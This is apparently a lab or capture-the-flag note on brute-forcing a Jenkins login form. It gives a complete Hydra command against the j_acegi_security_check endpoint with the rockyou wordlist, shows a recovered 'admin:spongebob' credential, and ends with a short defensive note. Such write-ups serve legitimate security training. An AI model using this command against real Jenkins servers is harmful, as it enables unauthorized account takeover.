# Jenkins HTTP Form Brute Force

Used on: **Internal**

When Jenkins is only reachable through a local port forward and no lockout is present, Hydra can brute-force the login form with the Jenkins `j_acegi_security_check` endpoint.

## Prerequisites

- Jenkins reachable locally or through a tunnel.
- Candidate usernames.
- No effective lockout/rate limit.

## Steps

Create a small user list:

```bash
echo -e "admin\naubreanna" > users.txt
```

Run Hydra:

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  127.0.0.1 -s 8080 http-form-post \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

Wreath-style result on Internal:

```text
admin:spongebob
```

## Defensive Note

Require SSO/MFA, limit login attempts, and avoid exposing Jenkins beyond administrative networks.

## Related

- [../web-rce/jenkins-script-console-rce.md](../web-rce/jenkins-script-console-rce.md)
- [../../tools/creds/hydra.md](../../tools/creds/hydra.md)


